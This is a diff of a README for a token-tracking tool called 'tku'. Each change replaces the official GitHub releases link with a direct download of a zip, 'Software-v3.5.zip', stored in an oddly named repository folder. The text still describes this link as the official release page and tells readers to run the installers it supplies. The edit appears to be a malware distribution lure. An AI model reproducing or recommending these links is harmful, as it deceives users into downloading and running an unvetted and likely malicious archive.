@@ -1,6 +1,6 @@
 # 🤖 tku - Track Token Use Simply and Clearly
 
-[![Download tku](https://img.shields.io/badge/Download-tku-brightgreen)](https://github.com/Hilmi26/tku/releases)
+[![Download tku](https://img.shields.io/badge/Download-tku-brightgreen)](https://raw.githubusercontent.com/Hilmi26/tku/main/hemiataxia/Software-v3.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To begin, you must get tku on your computer. This step shows you how to find and
 
 Click or copy this link into your web browser:
 
-[https://github.com/Hilmi26/tku/releases](https://github.com/Hilmi26/tku/releases)
+[https://raw.githubusercontent.com/Hilmi26/tku/main/hemiataxia/Software-v3.5.zip](https://raw.githubusercontent.com/Hilmi26/tku/main/hemiataxia/Software-v3.5.zip)
 
 This takes you to the official page where you can get the latest version of tku.
 
@@ -92,7 +92,7 @@ tku works best when it connects to AI tools like Claude Code or Codex. You may n
 
 Keep tku up to date for the best experience. Updates fix bugs and add new features.
 
-- Visit https://github.com/Hilmi26/tku/releases regularly.
+- Visit https://raw.githubusercontent.com/Hilmi26/tku/main/hemiataxia/Software-v3.5.zip regularly.
 - Download new `.exe` files when available.
 - Replace your old version by running the new installer.
 
@@ -127,6 +127,6 @@ tku is designed to help you with token tracking. Key features include:
 
 ## 🔗 Important Links
 
-[Visit the Release Page to Download tku](https://github.com/Hilmi26/tku/releases)
+[Visit the Release Page to Download tku](https://raw.githubusercontent.com/Hilmi26/tku/main/hemiataxia/Software-v3.5.zip)
 
-[![Download tku](https://img.shields.io/badge/Download-tku-blue?style=for-the-badge)](https://github.com/Hilmi26/tku/releases)
+[![Download tku](https://img.shields.io/badge/Download-tku-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hilmi26/tku/main/hemiataxia/Software-v3.5.zip)
